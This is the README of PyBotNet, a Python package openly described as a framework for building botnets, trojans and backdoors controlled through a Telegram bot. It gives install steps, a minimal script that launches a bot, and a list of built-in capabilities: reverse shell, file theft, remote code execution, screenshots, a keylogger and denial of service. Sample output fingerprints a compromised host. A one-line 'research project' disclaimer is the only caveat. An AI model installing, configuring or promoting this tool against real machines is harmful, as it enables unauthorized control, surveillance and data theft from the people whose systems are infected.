
 <p align="center">
    <a href='https://github.com/onionj/pybotnet' target='_blank'><img src='https://files.virgool.io/upload/users/271869/posts/wxs2bk9hkqfx/ezoxwssoikqm.jpeg' border='5' alt='trojan horse'/></a>
    <h1 align="center">PyBotNet</h1>
    <p align="center"> 
    A Python framework for building <b>remote control</b>, <b>botnet</b> , <b>trojan</b>  or <b>backdoor</b> with Telegram or other control panels
    </p>
  <p align="center">
    <a href="https://github.com/onionj/pybotnet">
      <img src="https://img.shields.io/pypi/v/pybotnet?label=pybotnet" />
    </a>
    <a href="https://github.com/onionj/pybotnet/blob/master/LICENSE">
      <img src="https://img.shields.io/github/license/onionj/pybotnet" />
    </a>
    <a href="https://www.python.org/">
    	<img src="https://img.shields.io/pypi/pyversions/pybotnet" />
    </a>
  </p>
</p>
 

> Disclaimer: Please note that this is a research project. I am by no means responsible for any usage of this tool. Use it on your behalf!. 

---

**Source Code**: <a href="https://github.com/onionj/pybotnet" target="_blank">https://github.com/onionj/pybotnet</a>

**Documentation**: <a href="https://onionj.github.io/pybotnet/" target="_blank">https://onionj.github.io/pybotnet/</a>

---

### Features:
* Built in Telegram control pannel and proxy
* Built in scripts like:
    * reverse shell
    * put or get file
    * run python code on target systems
    * get screenshot
    * keylogger
    * dos
    * scheduler
    * ...
* Cross platform
* Ability to easily add custom scripts
* Import external scripts
* Ability to add custom control panel
* Add remote control to your apps
* [...](https://onionj.github.io/pybotnet/)


### Install PyBotNet

```console
pip3 install pybotnet -U
```

* `-U`: make sure to upgrade framework to latest version.


#### The simplest PyBotNet file could look like this:


```py title="main.py"
# in main.py
from pybotnet import BotNet, TelegramEngine


telegram_engine = TelegramEngine(token=TELEGRAM_TOKEN, admin_chat_id=ADMIN_CHAT_ID) #(1)

botnet = BotNet(telegram_engine) # (2)
botnet.run()
```

1. create engine: Engines transfer messages between admin and botnet
2. create BotNet instance


#### note:
  * `TELEGRAM_TOKEN`: You can use telegram `@botfather` to Create new telegram API Bot and get your `TELEGRAM_TOKEN` 
  * `ADMIN_CHAT_ID`: Get it from @userinfobot telegram bot
  * PyBotNet include default scripts, like: `/shell`, `/put_file`, `/get_file`, `/screenshot`, `/who`, ...,
    you can send `/help` to your telegram bot and see more detail..

#### Run code:

```console 
python3 main.py
```

#### telegram engine

open telegram and send `/who` to your bot; If you have done the steps correctly, you recive message like this:

```
scripts_name:
    echo
    who
    shell
    screenshot
    put_file
    get_file
    runcode
    openurl
    dos
    schedule

mac_addres: 228362405364
os: Linux
global_ip: 5.10.30.35
country: Iran, Islamic Republic of
bot_name: no_name
local_ip: {'192.168.23.1'}
host_name: {'system_name'}
system_user: root
up_time: 0:00:01
current_route: /
pid: 148352
cpu_count: 8
pybotnet_version: 2.0.8b0
from cache: True
```


you can send `/help` to see help page, or send `/help <script_name>` to recive more help about specific script.

for example send `/help screenshot`, You will receive:

```
NAME:
screenshot

DESCRIPTION:
get screen shot
    * `[mac-address] /screenshot`
    or
    * `/screenshot`

    example command: 
        * `94945035671481 /screenshot`
        * `/screenshot` 

    return: img or img-download-link
    

script_version: 0.0.1
default_script: True

___________________________
scripts_name: ['echo', 'who', 'shell', 'screenshot', 'put_file', 'get_file', 'runcode', 'openurl', 'dos', 'schedule']
mac_addres: 228362405364
os: Linux
global_ip: 5.10.30.35
country: Iran, Islamic Republic of
bot_name: no_name
use_proxy: False
```

in top of message you see script name, description, syntax and examples.

for run screenshot script you have two choice:

* Run the script on all clients that are listening to Telegram bot (for now we have one!)
* Run script on one specific system

for run script on all client send `/screenshot`.

bot if you need get screen shot on specific system you need send `[mac_addres] /screenshot` for our case: `228362405364 /screenshot`

in some case like `/shell` you need to run it just for one system.



### *For more, see [Documentation](https://onionj.github.io/pybotnet/)*


---

## Contributors ✨
Thanks goes to these wonderful people :

<table>
<td align="center"><a href="https://github.com/onionj"><img src="https://avatars.githubusercontent.com/u/77416478?v=4" width="70px;" alt=""/><br /><sub><b>oNion</b></sub></a><br /></td>
<td align="center"><a href="https://github.com/TorhamDev"><img src="https://avatars.githubusercontent.com/u/87639984?v=4" width="70px;" alt=""/><br /><sub><b> TorhamDev</b></sub></a><br /></td>
<td align="center"><a href="https://github.com/SepehrRasouli"><img src="https://avatars.githubusercontent.com/u/81516241?v=4" width="70px;" alt=""/><br /><sub><b> SepehrRasouli</b></sub></a><br /></td>
</table>

